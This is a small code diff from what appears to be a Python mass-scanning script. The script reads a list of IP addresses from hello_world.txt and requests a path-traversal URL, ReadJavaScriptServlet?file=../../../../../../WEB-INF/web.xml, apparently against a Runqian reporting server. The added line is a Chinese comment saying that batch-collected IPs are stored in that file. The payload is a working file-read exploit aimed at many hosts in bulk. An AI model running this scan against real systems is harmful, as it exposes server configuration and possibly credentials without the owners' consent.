@@ -19,3 +19,4 @@ with open('hello_world.txt','r') as f:
         test_url_2=url+'/servlet/com.runqian.base.util.ReadJavaScriptServlet?file=../../../../../../WEB-INF/web.xml'
         #check(test_url_1)
         check(test_url_2)
+        #将批量获取到的IP地址保存在python文件同目录下的hello_world.txt中
